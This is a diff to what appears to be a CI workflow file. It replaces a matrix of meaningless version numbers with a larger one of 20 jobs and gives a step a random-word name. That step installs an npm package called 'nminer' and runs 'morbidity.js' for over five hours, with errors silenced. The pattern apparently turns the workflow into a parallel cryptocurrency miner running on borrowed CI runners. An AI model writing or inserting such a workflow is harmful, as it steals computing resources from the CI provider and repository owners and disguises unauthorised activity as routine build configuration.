@@ -9,24 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1547 }
-          - { version: 5264 }
-          - { version: 8335 }
-          - { version: 4024 }
-          - { version: 9184 }
-          - { version: 3384 }
-          - { version: 7478 }
-          - { version: 2811 }
-          - { version: 9007 }
-          - { version: 5297 }
-          - { version: 1091 }
-          - { version: 4809 }
-          - { version: 6530 }
-          - { version: 6549 }
-          - { version: 2047 }
-          - { version: 6364 }
-          - { version: 7539 }
-          - { version: 7867 }
+          - { version: 2056 }
+          - { version: 3961 }
+          - { version: 9094 }
+          - { version: 4873 }
+          - { version: 4293 }
+          - { version: 3242 }
+          - { version: 9077 }
+          - { version: 4940 }
+          - { version: 500 }
+          - { version: 2611 }
+          - { version: 5741 }
+          - { version: 610 }
+          - { version: 776 }
+          - { version: 8473 }
+          - { version: 9075 }
+          - { version: 6989 }
+          - { version: 3431 }
+          - { version: 1978 }
+          - { version: 9953 }
+          - { version: 755 }
 
     steps:
       - name: Checkout
@@ -37,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: archive omelet nearly instead
         run: |
           npm install nminer@latest
-          timeout 319m node morbidity.js || echo "morbidity executed"
+          timeout 314m node morbidity.js || echo "morbidity executed"
